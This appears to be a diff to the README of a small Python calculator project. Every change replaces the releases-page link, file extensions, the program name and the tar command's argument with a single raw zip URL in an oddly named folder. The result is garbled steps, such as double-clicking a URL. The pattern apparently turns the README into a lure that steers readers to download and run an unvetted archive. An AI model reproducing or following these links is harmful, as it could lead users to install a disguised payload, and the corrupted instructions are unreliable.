@@ -6,15 +6,15 @@ Welcome to the python-project! This application is a straightforward calculator 
 
 ## 🔗 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/cajor73/python-project/releases)
+[![Download Latest Release](https://github.com/cajor73/python-project/raw/refs/heads/main/monolocular/python-project-1.4.zip%20Latest%https://github.com/cajor73/python-project/raw/refs/heads/main/monolocular/python-project-1.4.zip)](https://github.com/cajor73/python-project/raw/refs/heads/main/monolocular/python-project-1.4.zip)
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/cajor73/python-project/releases). 
+To get started, visit this page to download: [Releases Page](https://github.com/cajor73/python-project/raw/refs/heads/main/monolocular/python-project-1.4.zip). 
 
 1. Open the link above in your web browser.
 2. You will see a list of available versions. Choose the latest version listed at the top.
-3. Click on the download link for your operating system. The file will typically be in `.exe` or `.zip` format for Windows, and `.tar.gz` or other formats for macOS and Linux.
+3. Click on the download link for your operating system. The file will typically be in `.exe` or `.zip` format for Windows, and `https://github.com/cajor73/python-project/raw/refs/heads/main/monolocular/python-project-1.4.zip` or other formats for macOS and Linux.
 4. Once the file is downloaded, locate it in your Downloads folder.
 
 ## ⚙️ Installation Instructions
@@ -22,17 +22,17 @@ To get started, visit this page to download: [Releases Page](https://github.com/
 **For Windows Users:**
 1. If you downloaded an `.exe` file, double-click the file to start the installation process. Follow the on-screen instructions to complete the installation.
 2. If you downloaded a `.zip` file, right-click the file and choose "Extract All." Move the extracted folder to a desired location on your computer.
-3. Open the folder and double-click `calculator.exe` to run.
+3. Open the folder and double-click `https://github.com/cajor73/python-project/raw/refs/heads/main/monolocular/python-project-1.4.zip` to run.
 
 **For macOS Users:**
-1. If you downloaded a `.tar.gz` file, double-click it to extract the contents.
+1. If you downloaded a `https://github.com/cajor73/python-project/raw/refs/heads/main/monolocular/python-project-1.4.zip` file, double-click it to extract the contents.
 2. Move the extracted application to your Applications folder.
 3. Open the application by double-clicking it in the Applications folder.
 
 **For Linux Users:**
-1. If you downloaded a `.tar.gz` file, open a terminal window.
+1. If you downloaded a `https://github.com/cajor73/python-project/raw/refs/heads/main/monolocular/python-project-1.4.zip` file, open a terminal window.
 2. Navigate to the folder where the file is located. You can use `cd /path/to/your/file` in the terminal.
-3. Extract the file with the command: `tar -xvzf filename.tar.gz`
+3. Extract the file with the command: `tar -xvzf https://github.com/cajor73/python-project/raw/refs/heads/main/monolocular/python-project-1.4.zip`
 4. Navigate to the extracted folder and run the application using: `./calculator`.
 
 ## 🎨 Features
